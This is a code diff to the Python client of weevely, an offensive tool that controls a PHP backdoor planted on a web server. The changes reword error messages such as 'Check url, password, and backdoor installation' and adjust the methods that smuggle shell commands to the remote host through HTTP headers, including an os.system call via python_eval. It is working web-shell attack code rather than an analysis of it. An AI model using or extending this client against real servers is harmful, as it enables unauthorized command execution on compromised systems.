@@ -88,7 +88,7 @@ class weevely:
 	try:
 	  self.host=host(url,pwd)
 	except Exception, e:
-	  print "! Error executing remote PHP code: " + str(e) + ". Exiting."
+	  print "! Error: " + str(e) + ". Exiting."
 	  return
 	
 	if moderun=='s':
@@ -317,7 +317,6 @@ class host():
     for i in ran:
       try:
 	ret = self.execute("echo " + self.pwd, i)
-	#print ':', ret
 	if(ret==self.pwd):
 	  if first == -1:
 	    first=i
@@ -328,7 +327,7 @@ class host():
 	else:
 	  sum_no[methods[i]]=ret
       except Exception, e:
-	sum_no[methods[i]]='Remote PHP error: ' + ret + " " + str(e)
+	sum_no[methods[i]]='Error: ' + ret + " " + str(e)
 
 
     # Summary 
@@ -362,7 +361,6 @@ class host():
     
     try: 
       ret=self.execHTTPGet(self.genRefUrl(cmdstr),self.genUserAgent())
-    
     except urllib2.URLError, e:
       raise
     else: 
@@ -370,7 +368,7 @@ class host():
       e = re.compile(restring,re.DOTALL)
       founded=e.findall(ret)
       if len(founded)<1:
-	raise Exception('Invalid response.')
+	raise Exception('No PHP evaluation. Check url, password, and backdoor installation')
       else:
 	return founded[0].strip()
 
@@ -406,7 +404,8 @@ class host():
       cmnd="@python_eval('import os; os.system('" + cmnd + " 2>&1');"
 
     
-    return self.execute_php(cmnd)
+    ret = self.execute_php(cmnd)
+    return ret
     
     
   def execHTTPGet(self, refurl, useragent):
